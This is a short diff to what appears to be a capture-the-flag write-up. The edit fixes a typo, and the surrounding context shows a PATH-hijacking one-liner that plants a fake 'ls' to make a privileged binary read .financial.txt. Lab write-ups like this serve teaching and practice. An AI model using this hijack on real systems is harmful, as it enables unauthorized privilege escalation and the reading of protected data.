@@ -35,7 +35,7 @@ Now it will look in the current directory, before looking in /bin. One thing goo
 
 ```./exportSafePerms```
 
-Because of the fact that it was a shared instance, and the directory was emptied every half second, you had to run everything in on command :
+Because of the fact that it was a shared instance, and the directory was emptied every half second, you had to run everything in one command :
 
 ```echo "cat .financial.txt" > ls && chmod +x ls && export PATH=.:$PATH && ./exportSafePerms```
 
